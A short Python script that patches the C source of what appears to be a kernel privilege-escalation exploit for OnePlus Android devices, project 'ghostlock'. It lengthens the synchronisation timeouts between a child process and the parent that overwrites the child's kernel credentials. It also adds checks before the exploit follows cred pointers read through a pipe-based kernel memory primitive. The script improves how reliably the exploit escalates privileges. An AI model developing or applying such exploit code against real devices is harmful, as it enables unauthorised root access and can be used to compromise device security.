#!/usr/bin/env python3
import sys, os
CORE = os.path.expanduser("~/ghostlock/ghostlock-oneplus/src/core")
F = os.path.join(CORE, "root.c")
s = open(F, encoding="utf-8").read()

# 1. root child waits much longer for the parent to patch its cred
old = """    for (int i = 0; i < 5000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }"""
new = """    /* The parent patches our cred via (slow) configfs reads; do not time out
     * and become a zombie with cred==NULL before it gets here. */
    for (int i = 0; i < 300000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }"""
if s.count(old) != 1:
    print("FAIL1: %d" % s.count(old)); sys.exit(1)
s = s.replace(old, new)

# 2. collect_root_child: wait longer for the child to report
old2 = """  for (int i = 0; i < 5000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }"""
new2 = """  for (int i = 0; i < 300000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }"""
if s.count(old2) != 1:
    print("FAIL2: %d" % s.count(old2)); sys.exit(1)
s = s.replace(old2, new2)

# 3. guard cred pointers before dereferencing (zombie tasks have cred==NULL)
old3 = """  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;"""
new3 = """  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  pr_info("root task=%016llx pid=%u tgid=%u comm=%s real_cred=%016llx cred=%016llx\\n",
          (unsigned long long)current_task_addr, found_task_pid, found_task_tgid,
          found_task_comm, (unsigned long long)current_real_cred_addr,
          (unsigned long long)current_cred_addr);
  if (!is_direct_ptr(current_cred_addr) ||
      !is_direct_ptr(current_real_cred_addr)) {
    pr_info("root bad cred (task probably already exited)\\n");
    return 0;
  }
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;"""
if s.count(old3) != 1:
    print("FAIL3: %d" % s.count(old3)); sys.exit(1)
s = s.replace(old3, new3)

open(F, "w", encoding="utf-8").write(s)
print("ok")
